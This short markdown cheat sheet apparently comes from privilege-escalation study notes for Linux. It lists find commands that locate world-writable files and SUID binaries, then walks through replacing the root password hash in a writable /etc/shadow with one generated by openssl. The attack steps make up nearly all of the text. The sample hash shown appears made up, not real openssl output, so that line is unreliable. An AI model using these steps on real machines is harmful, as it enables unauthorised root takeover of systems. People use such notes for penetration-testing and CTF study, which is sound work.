- __1.find / -not -type l -perm -o+w__
- __2.find /  -perm -u=s -type f 2>/dev/null__

- __If you have permission to write `/etc/shadow` use the below commands__
  - __First you need to creat a one hash password using openssl__
    - __`openssl passwd -1 -salt abc password123` it will give you a hash `$1$abc$DSFILJKSD7393llsd.0s/` copy that__
    - __Edit the root password__
      - __`root:$1$abc$DSFILJKSD7393llsd.0s/:1772:0:99999:7:::`__
